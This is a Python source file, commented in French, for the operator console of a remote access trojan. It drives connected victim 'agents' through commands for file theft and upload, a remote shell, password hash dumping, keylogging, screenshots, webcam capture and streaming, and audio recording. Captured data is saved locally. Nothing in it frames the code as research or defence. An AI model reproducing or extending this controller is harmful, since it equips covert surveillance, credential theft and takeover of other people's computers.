"""Gestionnaire de connexion pour un agent client."""

import base64
import logging
import os
import time
from datetime import datetime
from pathlib import Path
import sys

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from common.crypto import SecureSocket
from common.protocol import Message, MessageType

logger = logging.getLogger(__name__)


class AgentHandler:
    def __init__(self, sock, agent_id: int, addr: tuple, on_disconnect=None):
        self.sock = sock
        self.agent_id = agent_id
        self.addr = addr
        self.on_disconnect = on_disconnect
        self.connected = True
        self.info = {
            "id": agent_id,
            "host": addr[0],
            "port": addr[1],
            "connected_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        }

    def send(self, msg: Message) -> bool:
        try:
            data = msg.to_bytes()
            SecureSocket.send_data(self.sock, data)
            return True
        except Exception as e:
            logger.error(f"Erreur envoi agent {self.agent_id} : {e}")
            self.disconnect()
            return False

    def receive(self) -> Message:
        try:
            data = SecureSocket.recv_data(self.sock)
            if not data:
                self.disconnect()
                return None
            return Message.from_bytes(data)
        except Exception as e:
            logger.error(f"Erreur réception agent {self.agent_id} : {e}")
            self.disconnect()
            return None

    def interact(self):
        print(f"\n[*] Mode interactif avec l'agent {self.agent_id}")
        print("[*] Tapez 'exit' ou 'back' pour revenir\n")

        while self.connected:
            try:
                cmd_line = input(f"rat agent {self.agent_id} > ").strip()
                if not cmd_line:
                    continue
                if cmd_line.lower() in ("exit", "back", "quit"):
                    break
                if cmd_line.lower() == "help":
                    self._show_help()
                    continue
                self._execute_command(cmd_line)
            except KeyboardInterrupt:
                print("\n[!] Retour au menu")
                break
            except Exception as e:
                print(f"[!] Erreur : {e}")

    def _show_help(self):
        print("""
=== Commandes agent ===
help                  - Affiche cette aide
download <path>       - Télécharge un fichier
upload <local> <dest> - Upload un fichier
shell                 - Shell interactif
shell_start           - Démarre shell
shell_stop            - Arrête shell
shell_exec <cmd>      - Exécute commande
ipconfig              - Configuration réseau
screenshot            - Capture d'écran
search <pattern>      - Recherche fichier
hashdump              - Hashes
keylogger_start       - Démarre keylogger
keylogger_stop        - Arrête keylogger
keylogger_get         - Récupère touches
webcam_snapshot       - Photo webcam
webcam_stream_start   - Streaming webcam
webcam_stream_stop    - Arrête streaming
record_audio_start    - Enregistrement audio
record_audio_stop     - Arrête enregistrement
exit/back/quit        - Quitter
""")

    def _execute_command(self, cmd_line: str):
        parts = cmd_line.split()
        cmd = parts[0].lower()
        args = " ".join(parts[1:])

        if cmd == "help":
            self._show_help()
        elif cmd == "download":
            self._cmd_download(args)
        elif cmd == "upload":
            if len(parts) < 3:
                print("[!] Usage : upload <local> <dest>")
                return
            self._cmd_upload(parts[1], parts[2])
        elif cmd == "shell" or cmd == "shell_start":
            self._cmd_shell_start()
        elif cmd == "shell_stop":
            self._cmd_shell_stop()
        elif cmd == "shell_exec":
            self._cmd_shell_exec(args)
        elif cmd == "ipconfig":
            self._cmd_ipconfig()
        elif cmd == "screenshot":
            self._cmd_screenshot()
        elif cmd == "search":
            self._cmd_search(args)
        elif cmd == "hashdump":
            self._cmd_hashdump()
        elif cmd == "keylogger_start":
            self._cmd_keylogger_start()
        elif cmd == "keylogger_stop":
            self._cmd_keylogger_stop()
        elif cmd == "keylogger_get":
            self._cmd_keylogger_get()
        elif cmd == "webcam_snapshot":
            self._cmd_webcam_snapshot()
        elif cmd == "webcam_stream_start":
            self._cmd_webcam_stream_start()
        elif cmd == "webcam_stream_stop":
            self._cmd_webcam_stream_stop()
        elif cmd == "record_audio_start":
            self._cmd_record_audio_start()
        elif cmd == "record_audio_stop":
            self._cmd_record_audio_stop()
        else:
            print(f"[!] Commande inconnue : {cmd}")

    def _send_command(self, cmd_type, **kwargs):
        msg = Message(cmd_type, **kwargs)
        if self.send(msg):
            return self.receive()
        return None

    def _cmd_download(self, path: str):
        if not path:
            print("[!] Usage : download <chemin>")
            return
        response = self._send_command(MessageType.CMD_DOWNLOAD, path=path)
        if response and response.type == MessageType.RESP_FILE:
            data = base64.b64decode(response.payload.get("data", ""))
            filename = response.payload.get("filename", "downloaded_file")
            os.makedirs("downloads", exist_ok=True)
            save_path = os.path.join("downloads", filename)
            with open(save_path, "wb") as f:
                f.write(data)
            print(f"[+] Fichier téléchargé : {save_path} ({len(data)} octets)")
        elif response and response.type == MessageType.RESP_ERROR:
            print(f"[!] Erreur : {response.payload.get('error', 'Inconnue')}")

    def _cmd_upload(self, local_path: str, remote_path: str):
        if not os.path.exists(local_path):
            print(f"[!] Fichier local introuvable : {local_path}")
            return
        with open(local_path, "rb") as f:
            content = f.read()
        data_b64 = base64.b64encode(content).decode("utf-8")
        response = self._send_command(MessageType.CMD_UPLOAD, path=remote_path, data=data_b64)
        if response and response.type == MessageType.RESP_OK:
            print(f"[+] Fichier uploadé : {remote_path}")
        elif response and response.type == MessageType.RESP_ERROR:
            print(f"[!] Erreur : {response.payload.get('error', 'Inconnue')}")

    def _cmd_shell_start(self):
        response = self._send_command(MessageType.CMD_SHELL, action="start")
        if response:
            print(response.payload.get("output", ""))

    def _cmd_shell_stop(self):
        response = self._send_command(MessageType.CMD_SHELL, action="stop")
        if response:
            print(response.payload.get("output", ""))

    def _cmd_shell_exec(self, command: str):
        response = self._send_command(MessageType.CMD_SHELL, action="exec", command=command)
        if response:
            print(response.payload.get("output", ""))

    def _cmd_ipconfig(self):
        response = self._send_command(MessageType.CMD_IPCONFIG)
        if response:
            print(response.payload.get("output", ""))

    def _cmd_screenshot(self):
        response = self._send_command(MessageType.CMD_SCREENSHOT)
        if response and response.type == MessageType.RESP_DATA:
            data = base64.b64decode(response.payload.get("data", ""))
            os.makedirs("downloads", exist_ok=True)
            timestamp = int(time.time())
            save_path = f"downloads/screenshot_{timestamp}.png"
            with open(save_path, "wb") as f:
                f.write(data)
            print(f"[+] Screenshot sauvegardé : {save_path}")

    def _cmd_search(self, pattern: str):
        response = self._send_command(MessageType.CMD_SEARCH, pattern=pattern)
        if response:
            print(response.payload.get("output", ""))

    def _cmd_hashdump(self):
        response = self._send_command(MessageType.CMD_HASHDUMP)
        if response:
            print(response.payload.get("output", ""))

    def _cmd_keylogger_start(self):
        response = self._send_command(MessageType.CMD_KEYLOGGER_START)
        if response:
            print(response.payload.get("output", ""))

    def _cmd_keylogger_stop(self):
        response = self._send_command(MessageType.CMD_KEYLOGGER_STOP)
        if response:
            print(response.payload.get("output", ""))

    def _cmd_keylogger_get(self):
        response = self._send_command(MessageType.CMD_KEYLOGGER_GET)
        if response:
            print(response.payload.get("output", ""))

    def _cmd_webcam_snapshot(self):
        response = self._send_command(MessageType.CMD_WEBCAM_SNAPSHOT)
        if response and response.type == MessageType.RESP_DATA:
            data = base64.b64decode(response.payload.get("data", ""))
            os.makedirs("downloads", exist_ok=True)
            timestamp = int(time.time())
            save_path = f"downloads/webcam_{timestamp}.jpg"
            with open(save_path, "wb") as f:
                f.write(data)
            print(f"[+] Photo webcam sauvegardée : {save_path}")

    def _cmd_webcam_stream_start(self):
        response = self._send_command(MessageType.CMD_WEBCAM_STREAM_START)
        if response:
            print(response.payload.get("output", ""))

    def _cmd_webcam_stream_stop(self):
        response = self._send_command(MessageType.CMD_WEBCAM_STREAM_STOP)
        if response:
            print(response.payload.get("output", ""))

    def _cmd_record_audio_start(self):
        response = self._send_command(MessageType.CMD_RECORD_AUDIO_START)
        if response:
            print(response.payload.get("output", ""))

    def _cmd_record_audio_stop(self):
        response = self._send_command(MessageType.CMD_RECORD_AUDIO_STOP)
        if response and response.type == MessageType.RESP_DATA:
            data = base64.b64decode(response.payload.get("data", ""))
            os.makedirs("downloads", exist_ok=True)
            timestamp = int(time.time())
            save_path = f"downloads/audio_{timestamp}.wav"
            with open(save_path, "wb") as f:
                f.write(data)
            print(f"[+] Audio sauvegardé : {save_path}")

    def disconnect(self):
        if not self.connected:
            return
        self.connected = False
        try:
            self.sock.close()
        except Exception:
            pass
        if self.on_disconnect:
            self.on_disconnect(self.agent_id)